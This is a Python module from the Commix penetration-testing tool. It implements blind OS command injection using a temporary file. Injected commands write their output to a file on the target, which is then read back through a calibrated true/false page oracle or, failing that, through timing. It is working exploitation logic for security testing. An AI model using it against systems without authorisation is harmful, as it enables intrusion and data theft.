#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.core.parse import cmdline as menu
from src.utils import settings
from src.core.controller import handler
from src.core.controller import checks

"""
The "tempfile-based" injection technique on blind OS command injection.
__Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive results.
"""

"""
Calibrated once per confirmed boundary and kept for the rest of the run: 'None' means untried,
'False' means the target was tried and has no oracle to read the created file through, and anything
else is the channel to ask it with.
"""
_ORACLE_CHANNEL_CACHE = {}

"""
The payload builder for whichever sink is filling the file - the shell's own on an OS command
injection, the evaluated language's grammar on a code injection - the same choice this technique's
delay-based reading already makes.
"""
def _oracle_payloads():
  return checks.tempfile_based_payloads()

"""
Which of the oracle's shapes are worth trying. A bare exit status and a printed marker are two
different questions on a POSIX target, so both are tried in turn - but cmd.exe hands no exit status
back either way, and an evaluated language answers only by how far the page got, so trying a second,
identical shape there would just double what a failed calibration costs.
"""
def _oracle_shapes():
  if settings.TARGET_OS == settings.OS.WINDOWS or menu.options.eval_sink:
    return (True,)
  return (False, True)

"""
The oracle-side payload builder, in the shape the boolean-based technique's own bisection expects -
a length and a byte, asked of the created file rather than of a re-run command.
"""
class _FileOraclePayloads(object):
  def get_length(self, separator, OUTPUT_TEXTFILE, candidate_length, operator="-ge"):
    return _oracle_payloads().oracle_get_length(separator, OUTPUT_TEXTFILE, candidate_length, operator)
  def get_char(self, separator, OUTPUT_TEXTFILE, position, ascii_char, operator="-le"):
    return _oracle_payloads().oracle_get_char(separator, OUTPUT_TEXTFILE, position, ascii_char, operator)

_FILE_ORACLE_PAYLOADS = _FileOraclePayloads()

"""
Whether this boundary's created file is already known to read through a calibrated oracle - settled
during detection, before enumeration ever asks the target for anything, so a caller about to start
a run of un-timed reads can say so up front rather than only once the first one is already underway.
"""
def oracle_active(url, vuln_parameter, separator):
  return bool(_ORACLE_CHANNEL_CACHE.get((url, vuln_parameter, separator)))

"""
Whether this target's own pages already tell a true answer from a false one for the created file -
learned the same way the boolean-based technique learns it for a command: two questions with known
answers, asked both ways round, each shape (a branch that says nothing, and one made to print a
marker) tried in turn.
"""
def _calibrate_file_oracle(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG):
  from src.core.techniques.boolean_based import bb_handler, bb_injector

  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Trying to calibrate a boolean-based oracle for the created file."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  for printed in _oracle_shapes():
    settings.BOOLEAN_PRINTED_STATE = printed
    payload_true = _oracle_payloads().oracle_decision(separator, TAG, len(TAG), OUTPUT_TEXTFILE, holds=True)
    payload_false = _oracle_payloads().oracle_decision(separator, TAG, len(TAG), OUTPUT_TEXTFILE, holds=False)
    if not payload_true or not payload_false:
      continue
    # Unresolved on the way in - like the delay-based confirmation this replaces, the parameter is
    # whatever the first request lands on, discovered rather than given.
    page_true, code_true, vuln_parameter, prefix, suffix, reported_payload_true = bb_injector.page_of(payload_true, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
    page_false, code_false, vuln_parameter, prefix, suffix, _ = bb_injector.page_of(payload_false, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
    # A false answer that reads exactly like the unmodified page means the payload changed nothing
    # at all, whatever the two probes look like beside each other.
    if checks.comparable_page(page_false or "") == checks.comparable_page(settings.ORIGINAL_PAGE or ""):
      continue
    if not checks.calibrate_boolean_oracle(page_true, page_false, code_true, code_false):
      continue
    # Asked both ways round, because a page that says yes to anything is not answering the question.
    if checks.boolean_oracle(page_true, code_true) is not True:
      continue
    if checks.boolean_oracle(page_false, code_false) is not False:
      continue
    # Asked once more, because a page that moves on its own can answer either way by itself - this
    # is what tells a real branch apart from noise the diff ratio alone cannot.
    again, vuln_parameter = bb_injector.answer(payload_true, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
    if again is not True:
      continue
    return bb_handler.Channel(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter), vuln_parameter, reported_payload_true

  settings.BOOLEAN_PRINTED_STATE = False
  return None, vuln_parameter, None

"""
Whether this target and this separator are ones the oracle could apply to at all - the same
restrictions the boolean-based technique places on itself, checked once before spending a request
on either confirming or reading anything through it.
"""
def _oracle_eligible(separator):
  if menu.options.interpreter:
    return False
  return _oracle_payloads().oracle_supported(separator)

"""
Said once for the run, whichever way calibration went - so which of the two is actually reading
the created file is never left for the output to imply.
"""
def _announce_channel(channel):
  if channel and not settings.TEMPFILE_ORACLE_ANNOUNCED:
    settings.TEMPFILE_ORACLE_ANNOUNCED = True
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "The created file is read via a calibrated boolean-based oracle."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  elif not channel and not settings.TEMPFILE_TIME_FALLBACK_ANNOUNCED:
    settings.TEMPFILE_TIME_FALLBACK_ANNOUNCED = True
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "No oracle could be calibrated; trying time-based extraction."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

"""
The calibrated channel for this boundary and parameter, calibrating it first where nothing has
tried yet - cached by boundary, so a later call (confirming, then reading) never calibrates twice.
"""
def _channel_for(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG):
  cache_key = (url, vuln_parameter, separator)
  channel = _ORACLE_CHANNEL_CACHE.get(cache_key)
  if channel is None and cache_key not in _ORACLE_CHANNEL_CACHE:
    channel, _, _ = _calibrate_file_oracle(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG)
    _ORACLE_CHANNEL_CACHE[cache_key] = channel
    _announce_channel(channel)
  return channel

"""
Confirm this boundary through the oracle instead of a delay - the winning payload and the
parameter it landed on, so the caller can report the finding the way it already knows how to.
'None' leaves the caller to confirm it the slow way, exactly as before - the parameter is still
handed back either way, discovered here rather than given, exactly as the delay-based confirmation
this replaces already discovers it.
"""
def try_oracle_confirm(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG):
  if not _oracle_eligible(separator):
    return None, vuln_parameter
  # Nothing asked through the oracle is timed, so it needs none of the raised timeout and the
  # disabled keep-alive a request expecting a delay allows for - carried over from detection only
  # because nothing has turned it off yet, and paid on every question otherwise.
  previous = settings.TIME_RELATED_ATTACK
  settings.TIME_RELATED_ATTACK = False
  try:
    channel, vuln_parameter, reported_payload = _calibrate_file_oracle(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG)
    _announce_channel(channel)
    if not channel:
      return None, vuln_parameter
    # Seeded here so extraction, later, finds this same channel already calibrated instead of
    # calibrating a second time now that the parameter it landed on is known.
    _ORACLE_CHANNEL_CACHE[(url, vuln_parameter, separator)] = channel
    # The value actually sent, folded in during calibration - a fresh, unfolded recomputation here
    # would report a payload that replaces the parameter's value instead of following it.
    return reported_payload, vuln_parameter
  finally:
    settings.TIME_RELATED_ATTACK = previous

"""
Read a command's output off the created file through a calibrated oracle, in place of a delay -
'None' where no oracle could be calibrated for this target, which leaves the caller to fall back
to the delay-based reading this technique already does.
"""
def oracle_extract(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG, cmd):
  if not _oracle_eligible(separator):
    return None
  previous = settings.TIME_RELATED_ATTACK
  settings.TIME_RELATED_ATTACK = False
  try:
    channel = _channel_for(separator, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, TAG)
    if not channel:
      return None

    from src.core.techniques.boolean_based import bb_handler
    from src.core.requests import requests
    write_payload = _oracle_payloads().oracle_write(separator, cmd, OUTPUT_TEXTFILE)
    if not write_payload:
      return None
    requests.perform_injection(prefix, suffix, whitespace, write_payload, vuln_parameter, http_request_method, url)
    return bb_handler.retrieve(channel, OUTPUT_TEXTFILE, payloads=_FILE_ORACLE_PAYLOADS)
  finally:
    settings.TIME_RELATED_ATTACK = previous

"""
The "tempfile-based" injection technique handler
"""
def tfb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path):
  return handler.do_time_related_process(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path)

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response):
  settings.WEB_ROOT = ""
  # Check if attack is based on time delays.
  if not settings.TIME_RELATED_ATTACK :
    settings.TIME_RELATED_ATTACK = True

  # The temporary file proves execution either way - which sink filled it is what the type names.
  if menu.options.eval_sink:
    injection_type = settings.INJECTION_TYPE.BLIND_CE
  else:
    injection_type = settings.INJECTION_TYPE.BLIND
  technique = settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED
  # Read lazily by 'time_related_shell()' itself, on the first comparison that actually needs it -
  # which is only ever reached once the oracle this technique tries first has failed to calibrate.
  # Filled here in advance, the model would be built - and announced - whether or not it ends up
  # read at all.
  settings.BASELINE_TARGET = (url, http_request_method)

  if tfb_injection_handler(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path) is False:
    settings.TIME_RELATED_ATTACK = settings.TEMPFILE_BASED_STATE = False
    return False

# eof
